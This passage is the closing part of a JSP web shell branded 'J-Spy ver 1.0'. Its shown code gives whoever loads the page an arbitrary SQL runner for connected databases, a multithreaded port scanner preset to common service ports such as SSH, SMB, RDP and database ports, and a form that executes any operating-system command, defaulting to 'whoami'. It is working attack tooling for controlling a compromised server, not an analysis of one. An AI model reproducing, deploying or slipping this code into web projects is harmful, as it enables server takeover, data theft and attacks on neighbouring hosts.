						ArrayList tables = db.getTable(database);

						for (int i = 0; i < tables.size(); i++) {
							String s_table = (String) tables.get(i);
							if (table != null && table.equals(s_table)) {
								out.println("<option value=\"" + s_table
										+ "\" selected=\"selected\">"
										+ s_table + "</option>");
							} else {
								out.println("<option value=\"" + s_table
										+ "\">" + s_table + "</option>");
							}
						}
						out.println("</select>");

						// run sql form
						String sqltext = (request.getParameter("sql") == null) ? ""
								: htmlEscape(request.getParameter("sql"));
						out.println("<form method=\"POST\" action=\"\" onSubmit=\"runsql('"
								+ database
								+ "',this.sql.value);return false;\"><input name=\"sql\" type=\"text\" size=\"100\" value=\""
								+ sqltext
								+ "\"><input type=\"submit\" value=\"run\"></form>");

						if (dbAction.equals("showcolumn")) {
							String pagenum = request
									.getParameter("pagenum");
							db.getColumn(database, table, pagenum);
						}

						if (dbAction.equals("runsql")) {
							String sql = request.getParameter("sql");
							db.exec(database, sql);
						}
					}

				}

			} else if (action.equals("PortScan")) {
				out.println("Port Scan &raquo;<br>");
				String portAction = (request.getParameter("portAction") == null) ? "show"
						: request.getParameter("portAction");

				String ip = (request.getParameter("ip") == null) ? "127.0.0.1"
						: htmlEscape(request.getParameter("ip").trim());
				String port = (request.getParameter("port") == null) ? "21,22,25,80,110,135,139,445,1433,3306,3389,5631,43958"
						: htmlEscape(request.getParameter("port").trim());
				out.println("<form name=\"portscan\" id=\"portscan\" action=\"\" method=\"post\" onSubmit=\"return scan(this);\"><p>IP:<input name=\"ip\" id=\"ip\" value=\""
						+ ip
						+ "\" type=\"text\" size=\"20\"  />Port:<input name=\"port\" id=\"port\" value=\""
						+ port
						+ "\" type=\"text\" size=\"80\" /><input name=\"startscan\" id=\"startscan\" value=\"Scan\" type=\"submit\" size=\"100\"  /></p></form>");
				if (portAction.equals("scan")) {

					if (ip != null && port != null) {
						ip = ip.trim();
						String[] ports = port.trim().split(",");
						Integer[] dingo = new Integer[ports.length];
						for (int i = 0; i < ports.length; i++) {

							int iPort = Integer.parseInt(ports[i]);
							if (iPort >= 1 && iPort <= 65535) {
								dingo[i] = iPort;
							}
						}

						c = new java.util.concurrent.CountDownLatch(
								dingo.length);
						m = new ConcurrentHashMap();
						for (int i = 0; i < dingo.length; i++) {
							new ScanPort(m, ip, dingo[i], i).start();
						}
						c.await();
						for (int i = 0; i < dingo.length; i++) {
							if ((Integer) m.get(i) == 0) {
								out.println("port : " + dingo[i]
										+ " closed ");
								out.println("<br>");
							} else if ((Integer) m.get(i) == 1) {
								out.println("port : " + dingo[i] + " open ");
								out.println("<br>");
							}
						}
					}
				}

			} else if (action.equals("ExecuteCommand")) {
				out.println("Execute Command &raquo;<br>");
				String commandAction = (request
						.getParameter("commandAction") == null) ? "show"
						: request.getParameter("commandAction");
				String command = (request.getParameter("command") == null) ? "whoami"
						: request.getParameter("command").trim();
				String charset = (request.getParameter("charset") == null) ? defaultCharset
						: request.getParameter("charset").trim();
				out.println("<form name=\"executecommand\" id=\"executecommand\" action=\"\" method=\"post\" onSubmit=\"return exec(this);\"><p>Command:<input name=\"command\" id=\"command\" value=\""
						+ htmlEscape(command)
						+ "\" type=\"text\" size=\"80\" /><select id=\"charset\" name=\"charset\">");
				printCharset(out, charset);
				out.println("</select><input name=\"run\" id=\"run\" value=\"run\" type=\"submit\" size=\"100\"  /></p></form>");
				if (commandAction.equals("exec")) {

					if (command != null && charset != null) {
						command = command.trim();
						exec(out, command, charset);
					}
				}
			} else if (action.equals("JavaCode")) {
				out.println("Run JavaCode &raquo;<br>");

			} else if (action.equals("Logout")) {
				session.invalidate();
				response.sendRedirect(request.getRequestURI());
			}

		} catch (Exception e) {
			e.printStackTrace();
			if (e.getMessage() != null) {
				m(out, e.getMessage());
			} else {
				m(out, "System Error .Please check your input.");
			}
		}
	%>
	<div
		style="padding: 10px; border-bottom: 1px solid #fff; border-top: 1px solid #ddd; background: #eee;">
		Powered by <a href="http://dingody.iteye.com" target="_blank">dingo</a>
		J-Spy ver 1.0. Copyright (C) 2013-2014 All Rights Reserved.
	</div>
</body>
</html>
